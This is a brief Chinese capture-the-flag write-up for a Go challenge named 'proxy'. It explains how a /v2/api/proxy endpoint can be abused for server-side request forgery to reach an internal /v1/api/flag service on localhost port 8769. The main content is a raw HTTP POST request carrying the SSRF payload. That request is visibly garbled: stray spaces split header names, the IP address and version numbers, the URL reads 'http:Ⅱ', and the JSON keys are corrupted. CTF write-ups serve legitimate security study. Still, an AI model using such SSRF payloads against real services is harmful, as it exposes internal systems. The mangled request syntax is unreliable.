---
tags: [SSRF, Golang, 权限绕过]
---

# proxy

main.go 提供了一个 /v2/api/proxy 路由可以 SSRF, 直接构造数据包访问 8769 端口 (Go 后端) 的/v1/api/flag 即可

```
POST  /v2/api/proxy  HTTP/1.1
Host :  8 .147 .129 .74 :38938
Cache-Control :  max-age=0
Upgrade-Insecure-Requests :  1
User-Agent :  Mozilla/5 .0  (Macintosh;  Intel  Mac  OS  X  10__15__7 )  AppleWebKit/537 .36 (KHTML ,  like  Gecko)  Chrome/130 .0 .0 .0  Safari/537 .36

Accept :
text/html ,application/xhtml+xml ,application/xml;q=0 .9 ,image/avif ,image/webp ,im age/apng ,*/*;q=0 .8 ,application/signed-exchange;v=b3;q=0 .7
Accept-Encoding :  gzip ,  deflate ,  br
Accept-Language :  zh-CN ,zh;q=0 .9 ,en;q=0 .8
Connection :  keep-alive
Content-Type :  application/json
Content-Length :  226

{
"url":"http:Ⅱ127.0.0.1:8769/v1/api/flag", "method " : "POST " ,
"body " : "3 " ,
"headers " :{"a " : "b "} ,
"follow_redirects " :true
}


然后 base64 解码就是 flag
```

